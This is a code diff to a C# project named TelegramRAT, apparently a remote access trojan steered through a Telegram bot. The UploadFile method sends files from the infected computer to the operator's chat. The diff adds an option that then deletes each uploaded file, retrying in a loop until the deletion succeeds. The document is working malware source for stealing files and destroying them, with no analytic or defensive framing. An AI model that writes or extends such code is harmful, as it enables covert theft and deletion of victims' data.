@@ -122,7 +122,7 @@ namespace TelegramRAT
         }
 
         // Send file from computer to chat
-        public static void UploadFile(string file)
+        public static void UploadFile(string file, bool removeAfterUpload = false)
         {
             // If is file
             if(File.Exists(file))
@@ -132,6 +132,17 @@ namespace TelegramRAT
                 FileStream fs = File.OpenRead(file);
                 InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, file);
                 bot.SendDocumentAsync(chatID, inputOnlineFile);
+                // Remove after uploading
+                if(removeAfterUpload)
+                {
+                    while (true)
+                    {
+                        try { File.Delete(file); }
+                        catch (IOException)
+                        { continue; }
+                        break;
+                    }
+                }
             }
             // If is directory
             else if(Directory.Exists(file))
